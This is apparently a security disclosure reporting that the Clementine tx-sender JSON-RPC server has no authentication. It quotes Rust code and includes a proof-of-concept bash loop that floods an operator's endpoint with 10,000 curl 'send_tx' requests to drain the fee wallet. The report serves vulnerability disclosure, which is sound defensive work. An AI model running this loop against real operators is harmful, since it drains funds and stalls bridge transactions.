### Title
Unauthenticated tx-sender JSON-RPC Server Allows Unauthorized Transaction Injection and Fee-Wallet Drain — (`crates/clementine-tx-sender/src/jsonrpc/server.rs`)

### Summary

The standalone tx-sender JSON-RPC server exposes `send_tx` and `send_citrea_tx` with zero authentication. When the operator sets `TX_SENDER_JSONRPC_BIND=0.0.0.0`, any network-reachable party can inject arbitrary transactions into the tx-sender queue, trigger CPFP child-transaction creation that drains the fee wallet, and cancel legitimate bridge transactions — all without any credential.

### Finding Description

`start_jsonrpc_server` in `crates/clementine-tx-sender/src/jsonrpc/server.rs` builds the HTTP/JSON-RPC listener with `ServerBuilder::default()` and no middleware, token, or TLS layer:

```rust
let server: Server = ServerBuilder::default()
    .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
    .build(bind_addr)
    .await
    ...
``` [1](#0-0) 

The two registered methods accept caller-supplied data with no identity check:

- `send_tx` — deserialises a raw Bitcoin transaction and calls `insert_try_to_send`, which queues it for broadcasting with caller-chosen `fee_paying_type`, `cancel_outpoints`, `cancel_txids`, `activate_txids`, and `activate_outpoints`.
- `send_citrea_tx` — queues a Citrea DA payload for submission. [2](#0-1) 

The bind address is validated only to be `127.0.0.1` or `0.0.0.0`; `0.0.0.0` is explicitly permitted:

```rust
if bind != "127.0.0.1" && bind != "0.0.0.0" {
    return Err(BridgeError::EnvVarMalformed(...));
}
``` [3](#0-2) 

The standalone runner documents `0.0.0.0` as a valid production value:

```bash
export TX_SENDER_JSONRPC_BIND="${TX_SENDER_JSONRPC_BIND:-127.0.0.1}"
``` [4](#0-3) 

Contrast this with the TCP gRPC path, which enforces mTLS and the `OnlyAggregatorAndSelf` interceptor: [5](#0-4) [6](#0-5) 

The JSON-RPC server has no equivalent protection at all.

### Impact Explanation

An attacker with network access to the JSON-RPC port can:

1. **Drain the fee wallet** — inject a large volume of transactions with `FeePayingType::CPFP`. The tx-sender loop will attempt to create CPFP child transactions funded from the operator's fee wallet for each queued entry, exhausting the wallet balance. Without fee-wallet funds, legitimate bridge transactions (payout, challenge, reimbursement) cannot be fee-bumped and may time out, causing the operator to lose collateral.

2. **Cancel legitimate bridge transactions** — supply `cancel_outpoints` or `cancel_txids` referencing outpoints of in-flight bridge transactions. If the attacker's injected transaction confirms (e.g., a low-value self-spend), the tx-sender marks those outpoints as cancelled and stops retrying the legitimate transactions.

3. **Inject Citrea DA payloads** — call `send_citrea_tx` to submit arbitrary DA blobs, potentially disrupting the Citrea sequencer's view of bridge state.

The tx-sender manages the operator's fee wallet and controls which bridge transactions are broadcast and when — these are tx-sender-managed balances and bridge-controlled UTXOs within the allowed impact gate.

### Likelihood Explanation

The default bind is `127.0.0.1`, so the attack requires either:
- The operator sets `TX_SENDER_JSONRPC_BIND=0.0.0.0` (documented as valid), **or**
- The attacker has local process access (e.g., a compromised co-located container or sidecar).

The code provides no mechanism for the operator to add authentication even if desired — the absence of auth is a code-level defect, not merely a configuration choice. In containerised deployments where the tx-sender is a sidecar, `0.0.0.0` is a common misconfiguration.

### Recommendation

1. **Short term**: Add token-based or IP-allowlist authentication to `start_jsonrpc_server`. At minimum, reject connections whose source IP is not in a configured allowlist.
2. **Long term**: Migrate the JSON-RPC interface to a Unix domain socket (removing network exposure entirely) or add mTLS equivalent to the gRPC path. Restrict `TX_SENDER_JSONRPC_BIND` to `127.0.0.1` only, removing `0.0.0.0` as a valid value.

### Proof of Concept

With `TX_SENDER_JSONRPC_BIND=0.0.0.0` and `TX_SENDER_JSONRPC_PORT=3030`:

```bash
# Inject 10 000 CPFP transactions to drain the fee wallet
for i in $(seq 1 10000); do
  curl -s -H 'content-type: application/json' \
    --data "{\"jsonrpc\":\"2.0\",\"id\":$i,\"method\":\"send_tx\",\"params\":[{
      \"tx_metadata\": null,
      \"signed_tx_hex\": \"<any_valid_raw_tx_hex>\",
      \"fee_paying_type\": \"CPFP\",
      \"rbf_signing_info\": null,
      \"cancel_outpoints\": [],
      \"cancel_txids\": [],
      \"activate_txids\": [],
      \"activate_outpoints\": []
    }]}" \
    http://<operator_ip>:3030
done
```

Each queued entry causes the tx-sender loop to attempt a CPFP child transaction funded from the operator's fee wallet. With 10 000 entries the wallet is exhausted, and subsequent legitimate payout or challenge transactions cannot be fee-bumped, stalling the bridge and exposing the operator to collateral loss.

```rust
fn only_aggregator_and_self(
    req: Request<()>,
    our_cert: &CertificateDer<'static>,
    aggregator_cert: &CertificateDer<'static>,
) -> Result<Request<()>, Status> {
    let Some(peer_certs) = req.peer_certs() else {
        if cfg!(test) {
            // Test mode, we don't need to verify peer certificates
            return Ok(req);
        } else {
            // If we're not in test mode, we need to check peer certificates
            return Err(Status::unauthenticated(
                "Failed to verify peer certificate, is TLS enabled?",
            ));
        }
    };

    // IMPORTANT: Only check the leaf (end-entity) certificate, which is always the first
    // certificate in the chain. The leaf is the only certificate whose private key the peer
    // proved possession of during the TLS handshake. Checking anywhere else in the chain
    // would allow identity spoofing: an attacker could include a pinned cert as an
    // intermediate in their chain without possessing its private key.
    let Some(leaf_cert) = peer_certs.first() else {
        return Err(Status::unauthenticated("Peer certificate chain is empty"));
    };

    if is_internal(&req) {
        if leaf_cert == our_cert {
            Ok(req)
        } else {
            Err(Status::unauthenticated(
                "Unauthorized call to internal method (not self)",
            ))
        }
    } else if leaf_cert == aggregator_cert || leaf_cert == our_cert {
        Ok(req)
    } else {
        Err(Status::unauthenticated(
            "Unauthorized call to method (not aggregator or self)",
        ))
    }
